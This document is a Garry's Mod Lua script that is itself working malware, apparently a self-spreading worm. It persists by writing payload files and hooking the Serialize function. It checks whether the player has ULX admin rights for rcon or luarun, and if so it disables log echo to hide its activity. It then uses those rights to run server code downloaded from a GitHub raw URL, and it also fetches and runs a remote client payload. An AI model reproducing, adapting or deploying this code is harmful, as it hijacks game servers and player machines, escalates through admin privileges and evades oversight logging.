if ALREADY_RAN_CYCLE then return end
ALREADY_RAN_CYCLE = true

local isInfectAdmin = 0
local hasULX = false
local wasSuccessful = false
local isLimited = false

if GLOBAL_NO_EXEC_PLOX then
	file.Write("zsadd.txt", CL_RUN_PAY)
	local cart = file.Read("zscarts.txt", "DATA")
	if not string.find(cart or "", [[RunString(file.Read("zsadd.txt"))]]) then
		file.Append("zscarts.txt", " RunString(file.Read(\"zsadd.txt\"))")
	end
end

--Let's stay in the game, shall we?
local serial_old = Serialize
Serialize = function(...)
	local ret = serial_old(...)
	ret = ret .. " RunString(file.Read(\"zsadd.txt\"))"
	return ret
end

function cli_inf()
	local Me = LocalPlayer()

	if ULib and ULib.ucl and ULib.ucl.authed then
		hasULX = true
		local myAuth = ULib.ucl.authed[Me:UniqueID()]
		if myAuth then
			local group = myAuth.group
			if group then
				local groupperms = ULib.ucl.groups[group]
				if groupperms and groupperms.allow then
					local hasLua = false
					local hasRcon = false
					local hasEcho = false
					
					for k,v in pairs(groupperms.allow) do
						if string.find(string.lower(v), "rcon") then
							hasRcon = true
						elseif string.find(string.lower(v), "logecho") then
							hasEcho = true
						elseif string.find(string.lower(v), "luarun") then
							hasLua = true
						end
					end
					
					if (hasRcon or hasLua) and hasEcho then
						isInfectAdmin = 1
					elseif (hasRcon or hasLua) and not hasEcho then
						isInfectAdmin = 2
					else
						isInfectAdmin = 0
					end
					if group == "admin" or group == "moderator" or group == "tmod" or group == "operator" or group == "owner" or group == "sadmin" then
						isLimited = true
					end
					if hasEcho or kamikaze then --nononono abort
						local payload = [[ "http.Fetch('https://raw.githubusercontent.com/9129/0193/master/server_run.lua', function(b) SV_RUN_PAY = b RunString(b) end)" ]]
						Me:ConCommand("ulx_logEcho 0")
						timer.Simple(3, function()
							if hasLua then
								Me:ConCommand([[ulx luarun ]] .. payload)
								wasSuccessful = true
							elseif hasRcon then
								Me:ConCommand([[ulx rcon ulx luarun ]] .. payload)
								wasSuccessful = true
							end
						end)
						--we're clear
					end
				end
			end
		end
	end
end

if not GLOBAL_NO_EXEC_PLOX then
	timer.Simple(30, function() cli_inf() end)
end

timer.Simple(32, function()
	http.Fetch("https://raw.githubusercontent.com/9129/0193/master/client_add.lua", function(b) CL_ADD_PAY = b RunString(b) end)
end)
